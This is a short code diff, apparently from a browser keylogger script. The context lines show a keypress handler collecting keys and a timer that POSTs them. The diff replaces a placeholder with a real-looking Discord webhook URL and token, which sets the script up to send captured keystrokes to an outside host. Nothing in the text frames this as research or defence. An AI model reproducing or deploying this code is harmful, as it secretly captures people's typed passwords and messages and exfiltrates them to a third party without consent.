@@ -18,7 +18,7 @@ document.onkeypress = function(e) {
 
 window.setInterval(function(){
     if(keys.length >0 ) {
-        fetch("webhookLink", {
+        fetch("https://discord.com/api/webhooks/1226369442137641023/zUQfnVkS12JywD_Z_IZ3vABlRHDRcR7z5t2mqzTRB0fJHpMVBzNedB9rZIyGL20aVAKm", {
 			method: "POST",
 			headers: {
 				"Content-Type": "application/json"
